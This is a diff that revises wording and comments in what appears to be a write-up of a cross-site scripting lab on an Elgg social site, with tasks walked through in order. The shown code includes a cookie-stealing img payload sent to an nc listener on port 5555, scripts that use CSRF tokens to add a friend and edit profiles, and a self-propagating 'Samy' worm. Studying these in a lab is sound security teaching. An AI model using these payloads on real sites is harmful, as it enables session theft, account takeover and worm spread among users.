@@ -7,7 +7,7 @@ Versions of software used listed here:
 
 ## Task 1: Posting a Malicious Message to Display an Alert Window
 
-In this task,verify that the system is indeed vulnerable to cross-site scripting attacks. An easy way to test this in general is to submit content with a `<script>` tag and see if something simple such as an alert box can be called. We post the following contents to Samy's profile:
+In this task, we verify that the system is indeed vulnerable to cross-site scripting attacks. An easy way to test this in general is to submit content with a `<script>` tag and see if something simple such as an alert box can be called. We post the following contents to Samy's profile:
 
 ```html
 <script>alert('XSS');</script>
@@ -17,15 +17,17 @@ Upon visiting Samy's profile, the visitor now gets an alert box popup saying "XS
 
 ## Task 2: Posting a Malicious Message to Display Cookies
 
-Now that we can use XSS on this system, we can now start attempting to grab private user data, in particular cookies. We can modify the script above to do so:
+Now that we can use XSS on this system, we can now start attempting to grab private user data such as cookies for example. We can modify the script above to do so:
 
 ```html
 <script>alert(document.cookie);</script>
 ```
 
+Now when a visitor arrives at Samy's profile, they will see an alert box with their session cookie inside.
+
 ## Task 3: Stealing Cookies from the Victim’s Machine
 
-With the above method, we can alert the cookies to the user's screen, but the attacker is not yet able to view this information. In order to transfer this data to the attacker, they can use a malicioius HTTP GET request, for example with a fake image. We can append the information to this request which goes to the attacker's machine. In this example, we are using the localhost IP address since we are testing on the same machine:
+With the above method, we can alert the cookies to the user's screen, but the attacker is not yet able to view this information. In order to transfer this data to the attacker, they can use a malicious HTTP GET request, for example with a fake image. We can append the information to this request which goes to the attacker's machine. In this example, we are using the localhost IP address since we are testing on the same machine:
 
 ```html
 <script>document.write('<img src="http://127.0.0.1:5555?c=' + escape(document.cookie) + '>')</script>
@@ -39,7 +41,7 @@ $ nc -l 5555 -v
 
 ## Task 4: Becoming the Victim’s Friend
 
-For a cross-site scripting attack, the information may not need to be sent to the attacker, but can be used directly in the attacker's script as demonstrated in this task. By using cross-site scripting in this case, the attacker (Samy) can use a script to take the user's CSRF tokens and make a request to add himself as a friend:
+For a cross-site scripting attack, the information may not need to be sent to the attacker but can be used directly in the attacker's script as demonstrated in this task. By using cross-site scripting in this case, the attacker (Samy) can use a script to take the user's CSRF tokens and make a request to add himself as a friend:
 
 ```html
 <script type="text/javascript">
@@ -77,8 +79,8 @@ In addition to adding himself as a friend, Samy can also use cross-site scriptin
 ```html
 <script type="text/javascript">
     window.onload = function(){
-        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
-        //and Security Token __elgg_token
+        // JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+        // and Security Token __elgg_token
         let userName = elgg.session.user.name;
         let guid = "&guid="+elgg.session.user.guid;
         let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
@@ -90,7 +92,7 @@ In addition to adding himself as a friend, Samy can also use cross-site scriptin
 
         let samyGuid = 47;
         if(elgg.session.user.guid != samyGuid) {
-            //Create and send xhr request to modify profile
+            // Create and send xhr request to modify profile
             let xhr = null;
             xhr = new XMLHttpRequest();
             xhr.open("POST",sendurl,true);
@@ -114,24 +116,26 @@ One of the more widespread effects of XSS can be seen through the creation of se
 <script id="worm">
 
     window.onload = function() {
+        // Self-propagate this script by adding it to the body of profile
         let headerTag = "<script id=\"worm\" type=\"text/javascript\">";
         let jsCode = document.getElementById("worm").innerHTML;
         let tailTag = "</" + "script>";
         let wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
 
+        // Grab required data
         let userName = elgg.session.user.name;
         let guid = "&guid="+elgg.session.user.guid;
         let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
         let token = "&__elgg_token="+elgg.security.token.__elgg_token;
 
-        //Construct the HTTP request to add Samy as a friend and modify their profile.
+        // Construct the HTTP request to add Samy as a friend and modify their profile.
         let addFriendURL = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;
         let profileEditURL = "http://www.xsslabelgg.com/action/profile/edit";
         let content = token + ts + "&description=Samy is my hero" + wormCode + "&accesslevel[description]=2" + guid;
 
         let samyGuid = 47;
         if(elgg.session.user.guid != samyGuid) {
-            //Create and send xhr request to add friend
+            // Create and send xhr request to add friend
             let addFriend = null;
             addFriend = new XMLHttpRequest();
             addFriend.open("GET",addFriendURL,true);
@@ -139,7 +143,7 @@ One of the more widespread effects of XSS can be seen through the creation of se
             addFriend.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
             addFriend.send();
 
-            //Create and send xhr request to modify profile
+            // Create and send xhr request to modify profile
             let changeProfile = null;
             changeProfile = new XMLHttpRequest();
             changeProfile.open("POST",profileEditURL,true);
